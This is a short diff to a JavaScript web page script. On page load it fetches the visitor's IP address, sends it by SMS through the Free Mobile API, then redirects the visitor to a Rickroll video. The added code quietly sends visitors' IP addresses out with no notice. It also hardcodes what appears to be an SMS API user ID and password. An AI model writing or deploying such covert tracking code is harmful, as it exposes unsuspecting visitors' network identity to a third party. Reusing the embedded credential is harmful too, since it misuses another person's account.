@@ -5,10 +5,21 @@ async function RequestClientIP() {
 
 	const ip = await response.text();
 
-	console.log(ip);
+	return ip;
 
 }
 
-RequestClientIP();
+async function Prevenir(ip) {
+	await fetch("https://smsapi.free-mobile.fr/sendmsg?user=99453398&pass=hk5fTCl4EoOZnK&msg="+ ip);
+}
 
-// window.location.replace('http://example.com/');
+// RequestClientIP();
+// UpdateJSON(7);
+
+async function main() {
+	ip = await RequestClientIP();
+	Prevenir(ip);
+	window.location.replace('https://youtu.be/dQw4w9WgXcQ?si=UjDP6wq0JHuCkTr_');
+}
+
+main();
